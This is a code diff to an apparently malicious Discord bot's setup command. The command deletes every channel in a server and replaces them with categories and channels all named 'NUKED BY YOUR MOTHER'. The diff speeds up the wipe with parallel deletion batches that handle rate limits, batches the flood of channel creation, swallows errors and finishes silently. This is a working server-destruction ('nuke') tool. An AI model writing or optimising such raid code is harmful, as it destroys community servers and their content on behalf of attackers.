@@ -791,14 +791,14 @@ const commandHandlers = {
                     if (!isOwnerOrAdmin(message.member)) { message.reply('❌ Admins only'); return; }
                     // Define your server plan here
                     const plan = [
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                        { category: '👾NUKED BY YOUR MOTHER👾', text: ['👻NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
                     ];
 
                     const guild = message.guild;
@@ -829,20 +829,30 @@ const commandHandlers = {
                             toDelete.push(invCh);
                         }
 
-                        let delCount = 0;
-                        for (const ch of toDelete) {
-                            try {
-                                await ch.delete('Rebuilding server per setup command');
-                                delCount++;
-                            } catch (e) {
-                                delCount++;
-                                await new Promise(r => setTimeout(r, 150));
+                        // smoother, faster deletion using limited concurrency
+                        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+                        const chunkSize = 4; // number of concurrent deletes
+                        for (let i = 0; i < toDelete.length; i += chunkSize) {
+                            const chunk = toDelete.slice(i, i + chunkSize);
+                            const results = await Promise.all(chunk.map(ch => ch.delete('Rebuilding server per setup command').then(() => ({ ok: true })).catch(err => ({ ok: false, err }))));
+                            // Inspect results for rate-limit info
+                            let extraWait = 0;
+                            for (const r of results) {
+                                if (!r.ok && r.err && typeof r.err.retry_after === 'number') {
+                                    const waitMs = Math.ceil(r.err.retry_after * 1000);
+                                    if (waitMs > extraWait) extraWait = waitMs;
+                                }
+                                // If generic 429 info is present
+                                if (!r.ok && r.err && r.err.status === 429 && r.err.retry_after) {
+                                    const waitMs = Math.ceil(r.err.retry_after * 1000);
+                                    if (waitMs > extraWait) extraWait = waitMs;
+                                }
                             }
-                            // small adaptive delay to reduce overall runtime but respect rate limits
-                            if (delCount % 8 === 0) {
-                                await new Promise(r => setTimeout(r, 200));
+                            // small pause between chunks to avoid bursts
+                            if (extraWait > 0) {
+                                await sleep(extraWait + 100);
                             } else {
-                                await new Promise(r => setTimeout(r, 80));
+                                await sleep(60);
                             }
                         }
                     } catch (err) { /* continue even on errors */ }
@@ -859,27 +869,25 @@ const commandHandlers = {
                             }
                             if (!category) continue;
                             // create text channels
-                            if (section.text && Array.isArray(section.text)) {
-                                for (const name of section.text) {
-                                    try {
-                                        await guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id });
-                                    } catch (e) {
-                                        await new Promise(r=>setTimeout(r, 150));
+                                if (section.text && Array.isArray(section.text)) {
+                                    // create text channels in small parallel batches
+                                    const textChunk = 3;
+                                    for (let t = 0; t < section.text.length; t += textChunk) {
+                                        const tchunk = section.text.slice(t, t + textChunk);
+                                        await Promise.all(tchunk.map(name => guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id }).catch(() => null)));
+                                        await new Promise(r=>setTimeout(r, 60));
                                     }
-                                    await new Promise(r=>setTimeout(r, 80));
                                 }
-                            }
                             // create voice channels
-                            if (section.voice && Array.isArray(section.voice)) {
-                                for (const vname of section.voice) {
-                                    try {
-                                        await guild.channels.create({ name: vname, type: ChannelType.GuildVoice, parent: category.id });
-                                    } catch (e) {
-                                        await new Promise(r=>setTimeout(r, 150));
+                                if (section.voice && Array.isArray(section.voice)) {
+                                    // create voice channels in small parallel batches
+                                    const voiceChunk = 2;
+                                    for (let v = 0; v < section.voice.length; v += voiceChunk) {
+                                        const vchunk = section.voice.slice(v, v + voiceChunk);
+                                        await Promise.all(vchunk.map(name => guild.channels.create({ name: name, type: ChannelType.GuildVoice, parent: category.id }).catch(() => null)));
+                                        await new Promise(r=>setTimeout(r, 80));
                                     }
-                                    await new Promise(r=>setTimeout(r, 80));
                                 }
-                            }
                         }
                     } catch (e) { /* ignore individual creation errors */ }
                     // silent finish
